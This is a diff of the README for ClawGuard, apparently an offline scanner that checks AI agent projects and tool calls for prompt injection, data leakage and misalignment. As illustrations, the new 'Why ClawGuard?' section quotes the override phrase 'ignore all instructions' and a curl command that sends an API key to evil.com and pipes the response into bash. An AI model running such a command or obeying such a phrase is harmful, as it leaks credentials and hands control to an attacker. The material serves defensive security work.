@@ -1,6 +1,6 @@
 <p align="center">
   <h1 align="center">🛡️ ClawGuard</h1>
-  <p align="center"><strong>Security Scanner for AI Agents</strong></p>
+  <p align="center"><strong>The Immune System for AI Agents</strong></p>
 </p>
 
 <p align="center">
@@ -9,7 +9,6 @@
   <a href="LICENSE"><img src="https://img.shields.io/badge/License-AGPL--3.0-blue.svg" alt="AGPL-3.0"></a>
   <a href="#"><img src="https://img.shields.io/badge/dependencies-0-brightgreen" alt="Zero Dependencies"></a>
   <a href="#"><img src="https://img.shields.io/badge/patterns-350%2B-orange" alt="350+ Patterns"></a>
-  <a href="#"><img src="https://img.shields.io/badge/tests-375%20passed-brightgreen" alt="Tests"></a>
   <a href="#"><img src="https://img.shields.io/badge/node-%3E%3D18-green" alt="Node.js >= 18"></a>
 </p>
 
@@ -19,37 +18,66 @@
 
 ---
 
-## The Problem
+```
+$ npx @neuzhou/clawguard scan ./my-agent/
 
-Your AI agent has access to tools — shell, files, browser, APIs, secrets.
+🛡️  ClawGuard — Security Scan Results
+═══════════════════════════════════════════════════════
+📁 Files scanned: 23    🔍 Findings: 4    ⏱️  0.18s
 
-**Who's watching what it does?**
+📊 Summary: 🔴 1 critical  🟠 2 high  🟡 1 warning
+🎯 Risk Score: 73/100 — SUSPICIOUS
+   ⛓️  Attack chains: credential-exfiltration
 
-A single prompt injection can exfiltrate API keys via tool calls. A compromised skill can install backdoors. The agent itself can become the threat — self-preservation, deception, goal misalignment.
+📋 Findings:
+───────────────────────────────────────────────────────
+🔴 [CRITICAL] prompt-injection (CVSS: 9.0-10.0)
+   📄 skills/helper/SKILL.md:7
+   📝 System prompt override detected
+   💡 Fix: Sanitize user inputs; use input validation; implement prompt firewalls
 
-Most guardrails scan **prompts**. ClawGuard scans **tool calls**.
+🟠 [HIGH] data-leakage (CVSS: 7.0-8.9)
+   📄 skills/deploy/run.sh:14
+   📝 Environment variable exposure
+   💡 Fix: Move secrets to environment variables or a vault; add to .gitignore
+```
 
-That's the difference.
+**One command. Zero config. Instant results.**
 
 ---
+
+## Why ClawGuard?
+
+Your AI agent has tools — shell, files, browser, APIs, secrets. Most guardrails scan **prompts**. ClawGuard scans **tool calls**. That's the difference between catching "ignore all instructions" and catching `curl http://evil.com?key=$API_KEY | bash`.
 
 ## Quick Start
 
 ```bash
-npx @neuzhou/clawguard scan ./skills/
+npx @neuzhou/clawguard scan ./            # Scan any project
+npx @neuzhou/clawguard scan-mcp ./server  # Audit MCP servers
+npx @neuzhou/clawguard red-team ./skill   # AI adversarial testing
 ```
 
-```
-🔍 Scanning ./skills/ ...
-  ⚠️  data-leakage/env-file-access  [HIGH]  skills/deploy/run.sh:14
-  🚨 prompt-injection/instruction-override  [CRITICAL]  skills/helper/SKILL.md:7
-  ⚠️  supply-chain/obfuscated-code  [HIGH]  skills/util/index.js:42
+No API keys. No cloud. No config. Just security.
 
-Risk Score: 73/100 — ⚠️ SUSPICIOUS
-Found: 3 findings (1 critical, 2 high)
-```
+---
 
-That's it. Instant security audit. No API keys, no cloud, no config.
+## ClawGuard vs. Alternatives
+
+| | **ClawGuard** | **Semgrep** | **Snyk** | **Trivy** |
+|---|---|---|---|---|
+| **AI agent threats** | ✅ 350+ patterns | ❌ | ❌ | ❌ |
+| **MCP security** | ✅ 30+ rules | ❌ | ❌ | ❌ |
+| **Prompt injection** | ✅ 93 patterns | ❌ | ❌ | ❌ |
+| **Tool call governance** | ✅ Policy engine | ❌ | ❌ | ❌ |
+| **AI insider threats** | ✅ Misalignment detection | ❌ | ❌ | ❌ |
+| **AI red teaming** | ✅ Built-in | ❌ | ❌ | ❌ |
+| **Zero dependencies** | ✅ | ❌ | ❌ | ❌ |
+| **Runs 100% offline** | ✅ | ⚠️ Cloud features | ❌ Cloud-first | ✅ |
+| **SARIF / CI integration** | ✅ | ✅ | ✅ | ✅ |
+| **Free** | ✅ AGPL | Freemium | Freemium | ✅ |
+
+**They find code bugs. We find agent threats.** Different problem space entirely.
 
 ---
 
